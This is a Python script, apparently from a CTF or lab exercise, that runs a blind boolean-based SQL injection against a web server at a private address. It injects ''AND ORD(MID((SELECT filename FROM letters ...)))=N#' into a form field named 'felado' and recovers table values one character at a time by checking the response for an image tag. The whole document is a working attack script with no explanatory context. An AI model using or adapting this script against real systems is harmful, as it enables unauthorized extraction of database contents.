import requests

url = "http://10.10.8.11:8777/"
chars = "abcdefghijklmnopqrstuvwxyz01234567890. "

db = "diana"

for i in range(2,4):
    #print(i)
    table = ""
    while True:
        br = True
        for char in range(0,255):
            l = len(table)+1
            #expr = f"MID((SELECT id FROM letters LIMIT {i},1),{l},1)='{char}'"
            expr = f"ORD(MID((SELECT filename FROM letters LIMIT {i},1),{l},1))={char}"
            data = {"felado": "'AND " + expr +"#"}
            resp = requests.post(url, data = data)
            found = "<img" in resp.text
            if found:
                table = table + chr(char)
                br = False
                print(table)
                break
        if br:
            break
